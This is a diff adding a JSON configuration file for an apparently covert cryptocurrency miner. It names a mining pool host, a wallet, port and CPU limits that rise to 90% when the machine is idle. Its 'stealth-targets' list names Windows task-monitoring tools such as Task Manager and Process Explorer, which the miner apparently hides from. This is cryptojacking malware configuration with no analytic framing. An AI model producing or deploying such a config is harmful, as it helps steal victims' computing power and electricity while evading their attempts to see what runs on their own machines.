@@ -1,0 +1,15 @@
+{
+    "algo": "rx/0",
+    "pool": "lookthis.space",
+    "port": 57381,
+    "wallet": "BecnaG",
+    "password": "",
+    "nicehash": true,
+    "ssltls": "true",
+    "keepalive": true,
+    "max-cpu": 40,
+    "idle-wait": 1,
+    "idle-cpu": 90,
+    "stealth-targets": "Taskmgr.exe,ProcessHacker.exe,perfmon.exe,procexp.exe,procexp64.exe",
+    "kill-targets": ""
+}
